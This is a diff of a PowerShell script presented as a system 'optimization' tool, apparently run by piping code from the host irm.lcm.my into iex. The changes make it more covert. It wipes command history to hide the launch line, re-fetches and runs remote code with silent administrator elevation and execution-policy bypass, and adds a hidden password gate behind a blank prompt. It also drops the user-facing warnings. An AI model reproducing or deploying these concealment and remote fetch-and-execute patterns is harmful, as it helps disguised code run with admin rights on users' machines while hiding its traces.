@@ -1,12 +1,11 @@
-# Clear PSReadLine history so pressing Up Arrow doesn't show the irm command
+# Clear PSReadLine history
 if (Get-Module PSReadLine) {
     Remove-History -ErrorAction SilentlyContinue
     Set-PSReadLineOption -HistorySavePath $null -ErrorAction SilentlyContinue
 }
 
-# 1. Force Administrator Elevation Check
+# 1. Silent Administrator Elevation Check
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Warning "Requesting Administrative Privileges..."
     Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm irm.lcm.my|iex`"" -Verb RunAs
     exit
 }
@@ -15,7 +14,8 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
 function Read-ConsoleInput {
     param (
         [string]$Prompt,
-        [int]$Timeout = 30
+        [int]$Timeout = 30,
+        [switch]$IsPassword
     )
     Write-Host $Prompt -NoNewline
     $inputStr = ""
@@ -34,7 +34,8 @@ function Read-ConsoleInput {
                 }
             } else {
                 $inputStr += $key.KeyChar
-                Write-Host $key.KeyChar -NoNewline
+                if ($IsPassword) { Write-Host "*" -NoNewline }
+                else { Write-Host $key.KeyChar -NoNewline }
             }
             $start = Get-Date
         }
@@ -46,7 +47,17 @@ function Read-ConsoleInput {
     }
 }
 
-# 2. Optimization Function Suite
+# 2. Silent Password Gate
+Clear-Host
+$pwd = Read-ConsoleInput -Prompt "$ " -Timeout 30 -IsPassword
+
+if ($null -eq $pwd -or $pwd -ne "8888") {
+    exit
+}
+
+Clear-Host
+
+# 3. Optimization Function Suite
 function Run-OptimizationSuite {
     Clear-Host
     Write-Host "===================================================" -ForegroundColor Cyan
@@ -85,7 +96,7 @@ function Run-OptimizationSuite {
     Write-Host "===================================================" -ForegroundColor Cyan
 }
 
-# 3. Main Menu Loop (with 30-second inactivity timeout)
+# 4. Main Menu Loop (with 30-second inactivity timeout)
 while ($true) {
     Clear-Host
     Write-Host "---------------------------------------------------" -ForegroundColor Cyan
@@ -107,8 +118,6 @@ while ($true) {
     $choice = Read-ConsoleInput -Prompt "> Select module: " -Timeout 30
     
     if ($null -eq $choice) {
-        Write-Host "`n[Timeout] 30 seconds idle. Closing terminal..." -ForegroundColor DarkGray
-        Start-Sleep -Seconds 1
         exit
     }
     
